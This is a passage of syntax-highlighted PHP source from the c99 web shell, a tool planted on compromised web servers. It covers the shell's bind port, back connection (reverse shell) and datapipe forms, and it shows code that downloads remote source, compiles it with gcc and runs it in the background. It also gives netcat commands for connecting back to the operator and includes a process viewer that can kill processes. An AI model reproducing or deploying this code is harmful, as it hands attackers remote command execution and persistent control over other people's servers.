  <span class="k">elseif</span> <span class="p">(</span><span class="nb">fsockopen</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">),</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">],</span><span class="nv">$errno</span><span class="p">,</span><span class="nv">$errstr</span><span class="p">,</span><span class="mf">0.1</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Port alredy in use, select any other!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="nv">$srcpath</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="o">.</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">];</span>
   <span class="nv">$w</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]);</span>
   <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$w</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
   <span class="nb">unset</span><span class="p">(</span><span class="nv">$w</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]);</span>
   <span class="nv">$srcpath</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
   <span class="nv">$binpath</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;pl&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$binpath</span> <span class="o">=</span> <span class="nv">$srcpath</span><span class="p">;}</span>
   <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">);</span>
   <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">,</span><span class="s2">&quot;ab+&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t write sources to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$srcpath</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span> <span class="o">=</span> <span class="nx">c99getsource</span><span class="p">(</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t download sources!&quot;</span><span class="p">;}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;c&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$retgcc</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;gcc -o &quot;</span><span class="o">.</span><span class="nv">$binpath</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$srcpath</span><span class="p">);</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">);}</span>
    <span class="k">list</span><span class="p">(</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remotehost&quot;</span><span class="p">],</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remoteport&quot;</span><span class="p">])</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remoteaddr&quot;</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%path&quot;</span><span class="p">,</span><span class="nv">$binpath</span><span class="p">,</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%localport&quot;</span><span class="p">,</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;localport&quot;</span><span class="p">],</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%remotehost&quot;</span><span class="p">,</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remotehost&quot;</span><span class="p">],</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%remoteport&quot;</span><span class="p">,</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remoteport&quot;</span><span class="p">],</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$retbind</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;gt; /dev/null &amp;&quot;</span><span class="p">);</span>
    <span class="nb">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
    <span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">],</span><span class="nv">$errno</span><span class="p">,</span><span class="nv">$errstr</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;I can&#39;t connect to localhost:&quot;</span><span class="o">.</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;localport&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;! I think you should configure your firewall.&quot;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Running datapipe... ok! Connect to &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;, and you will connected to &quot;</span><span class="o">.</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remoteaddr&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;! You should use NetCat&amp;copy;, run </span><span class="se">\&quot;</span><span class="s2">&amp;lt;b&amp;gt;nc -v &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;center&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;processes&#39;;document.todo.grep.value=&#39;&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$binpath</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;View datapipe process&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span><span class="x">&amp;lt;b&amp;gt;Binding port:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=tools&amp;gt;&amp;lt;input type=hidden name=d value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$d</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;Port: &amp;lt;input type=text name=&quot;bind[port]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;Password: &amp;lt;input type=text name=&quot;bind[pass]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;pass&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;select name=&quot;bind[src]&quot;&amp;gt;</span><span class="cp">&lt;?php</span>
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$bndportsrcs</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">==</span> <span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">])</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; selected&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="cp">?&gt;</span><span class="x">&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=submit name=bindsubmit value=&quot;Bind&quot;&amp;gt;&amp;lt;/form&amp;gt;</span>
<span class="x">&amp;lt;b&amp;gt;Back connection:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=tools&amp;gt;&amp;lt;input type=hidden name=d value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$d</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;HOST: &amp;lt;input type=text name=&quot;bc[host]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;Port: &amp;lt;input type=text name=&quot;bc[port]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;select name=&quot;bc[src]&quot;&amp;gt;</span><span class="cp">&lt;?php</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$bcsrcs</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">==</span> <span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">])</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; selected&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;}</span>
<span class="cp">?&gt;</span><span class="x">&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=submit name=bcsubmit value=&quot;Connect&quot;&amp;gt;&amp;lt;/form&amp;gt;</span>
<span class="x">Click &quot;Connect&quot; only after open port for it. You should use NetCat&amp;copy;, run &quot;&amp;lt;b&amp;gt;nc -l -n -v -p </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$bc_port</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&quot;!&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">&amp;lt;b&amp;gt;Datapipe:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=tools&amp;gt;&amp;lt;input type=hidden name=d value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$d</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;HOST: &amp;lt;input type=text name=&quot;datapipe[remoteaddr]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remoteaddr&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;Local port: &amp;lt;input type=text name=&quot;datapipe[localport]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;localport&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;select name=&quot;datapipe[src]&quot;&amp;gt;</span><span class="cp">&lt;?php</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$dpsrcs</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">==</span> <span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">])</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; selected&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;}</span>
<span class="cp">?&gt;</span><span class="x">&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=submit name=dpsubmit value=&quot;Run&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;b&amp;gt;Note:&amp;lt;/b&amp;gt; sources will be downloaded from remote server.</span><span class="cp">&lt;?php</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;processes&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Processes:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span><span class="nv">$handler</span> <span class="o">=</span> <span class="s2">&quot;ps -aux&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$grep</span><span class="o">?</span><span class="s2">&quot; | grep &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$grep</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);}</span>
 <span class="k">else</span> <span class="p">{</span><span class="nv">$handler</span> <span class="o">=</span> <span class="s2">&quot;tasklist&quot;</span><span class="p">;}</span>
 <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="nv">$handler</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t execute </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$handler</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&quot;</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$processes_sort</span><span class="p">))</span> <span class="p">{</span><span class="nv">$processes_sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;}</span>
  <span class="nv">$parsesort</span> <span class="o">=</span> <span class="nx">parsesort</span><span class="p">(</span><span class="nv">$processes_sort</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
  <span class="nv">$k</span> <span class="o">=</span> <span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.processes_sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;!&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.processes_sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;!&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sig</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;}</span>
    <span class="k">echo</span> <span class="s2">&quot;Sending signal &quot;</span><span class="o">.</span><span class="nv">$sig</span><span class="o">.</span><span class="s2">&quot; to #&quot;</span><span class="o">.</span><span class="nv">$pid</span><span class="o">.</span><span class="s2">&quot;... &quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">posix_kill</span><span class="p">(</span><span class="nv">$pid</span><span class="p">,</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;OK.&quot;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;ERROR.&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);}</span>
   <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
   <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
   <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
   <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.processes_sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span>
        <span class="p">{</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
     <span class="nv">$line</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">get_current_user</span><span class="p">())</span> <span class="p">{</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="nv">$line</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;processes&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.pid.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sig.value=&#39;9&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;KILL&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
